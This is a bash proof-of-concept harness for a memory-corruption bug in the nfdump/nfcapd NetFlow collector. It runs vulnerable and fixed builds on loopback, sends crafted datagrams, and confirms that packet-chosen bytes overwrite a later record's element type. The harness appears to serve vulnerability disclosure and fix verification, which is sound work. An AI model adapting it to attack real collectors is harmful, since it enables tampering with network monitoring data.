#!/usr/bin/env bash
# nfdump2shell: live loopback proof that the pinned truncated-EXgenericFlow
# ICMP swap writes packet-chosen bytes into a LATER record's ELEMENT TYPE,
# and that the chosen byte decides whether VerifyV3Record() accepts the
# processed record. Record 2's wire type is 43 (rejected) in every case;
# only the crossing write can turn it into EXgenericFlow=1 (accepted).
set -u
cd "$(dirname "$0")"
V=${V_BUILD:-src/build-vuln-asan/src}
F=${F_BUILD:-src/build-fixed-asan/src}
VP=${V_PLAIN:-src/build-vuln-plain/src}
OUT=${ETYPE_OUT:-harness/out/etype}
if [ ! -x "$V/nfcapd/nfcapd" ] || [ ! -x "$F/nfcapd/nfcapd" ] || [ ! -x "$VP/nfcapd/nfcapd" ]; then
    bash build-wire.sh || exit 2
fi
mkdir -p "$OUT"

PASS=0; FAIL=0
ok()  { printf 'PASS %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf 'FAIL %s\n' "$1"; FAIL=$((FAIL+1)); }
need() { # FILE PATTERN LABEL
    if grep -q "$2" "$1" 2>/dev/null; then ok "$3"; else bad "$3"; fi
}
none() { # FILE PATTERN LABEL
    if grep -q "$2" "$1" 2>/dev/null; then bad "$3"; else ok "$3"; fi
}

run_case() { # LABEL BUILD PORT MODE
    local label=$1 build=$2 port=$3 mode=$4
    local dir="$OUT/$label"
    rm -rf "$dir"; mkdir -p "$dir/flows"
    ASAN_OPTIONS=detect_leaks=0 "$build/nfcapd/nfcapd" \
        -4 -b 127.0.0.1 -p "$port" -M "$dir/flows" -t 5 >"$dir/daemon.log" 2>&1 &
    local pid=$!
    sleep 1
    python3 harness/wire_send.py "$port" "$mode" >"$dir/sender.log" 2>&1
    sleep 1
    kill -TERM "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
    local cap
    cap=$(find "$dir/flows" -type f | sort | head -1)
    printf 'REC2_FOUND=0\n' >"$dir/readback.txt"
    if [ -n "$cap" ]; then
        python3 harness/alias_readback.py "$cap" etype >"$dir/readback.txt" 2>&1
        ASAN_OPTIONS=detect_leaks=0 "$build/nfdump/nfdump" -r "$cap" \
            -o 'fmt:%ts|%sp|%dp|%pr|%pkt|%byt' >"$dir/flows.txt" 2>&1 || true
    else
        printf 'Summary: total flows: 0\n' >"$dir/flows.txt"
    fi
    echo "=== $label mode=$mode ==="
    head -1 "$dir/sender.log"
    cat "$dir/readback.txt"
    grep -E 'Corrupt nfd record|record size error|ERROR: AddressSanitizer' "$dir/daemon.log" || true
    grep -E '^Summary: total flows' "$dir/flows.txt" 2>/dev/null || true
}

run_case vuln-etype-asan "$V" 10131 etype; D="$OUT/vuln-etype-asan"
need "$D/sender.log" 'WIRE_LEN=331' 'etype: 331-byte two-record datagram'
need "$D/readback.txt" 'REC2_FOUND=1 REC2_TYPE=0100 REC2_LENGTH=0101' 'asan vuln: chosen nfversion becomes processed element type 1'
need "$D/readback.txt" 'REC2_FLAGS_NFVERSION=0000' 'asan vuln: swap zeroes flags/nfversion'
need "$D/flows.txt" 'total flows: 2' 'asan vuln: two flows written'
none "$D/daemon.log" 'Corrupt nfd record' 'asan vuln: record 2 accepted'
none "$D/daemon.log" 'ERROR: AddressSanitizer' 'asan vuln: no report in 64 KiB buffer'

run_case vuln-etype-plain "$VP" 10132 etype; D="$OUT/vuln-etype-plain"
need "$D/readback.txt" 'REC2_FOUND=1 REC2_TYPE=0100 REC2_LENGTH=0101' 'plain vuln: same chosen element type without ASan'
need "$D/flows.txt" 'total flows: 2' 'plain vuln: two flows written'

run_case vuln-etype-bad "$V" 10133 etype-bad; D="$OUT/vuln-etype-bad"
need "$D/readback.txt" 'REC2_FOUND=0' 'asan vuln bad byte: no processed record 2'
need "$D/daemon.log" 'Corrupt nfd record: expected 2 records, processd: 1' 'asan vuln bad byte: chosen type 43 rejects record 2'
need "$D/flows.txt" 'total flows: 1' 'asan vuln bad byte: only record 1 written'

run_case vuln-etype-safe "$V" 10134 etype-safe; D="$OUT/vuln-etype-safe"
need "$D/sender.log" 'WIRE_LEN=349' 'safe: 349-byte two-record datagram'
need "$D/readback.txt" 'REC2_FOUND=0' 'safe: no crossing write, no processed record 2'
need "$D/daemon.log" 'Corrupt nfd record' 'safe: wire type 43 rejects record 2'
need "$D/flows.txt" 'total flows: 1' 'safe: only record 1 written after type-43 rejection'

run_case fixed-etype "$F" 10135 etype; D="$OUT/fixed-etype"
need "$D/daemon.log" 'Corrupt nfd record: expected 2 records, processd: 0' 'fixed: short element rejected live'
need "$D/flows.txt" 'total flows: 0' 'fixed: no flow written'

printf 'TOTAL: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
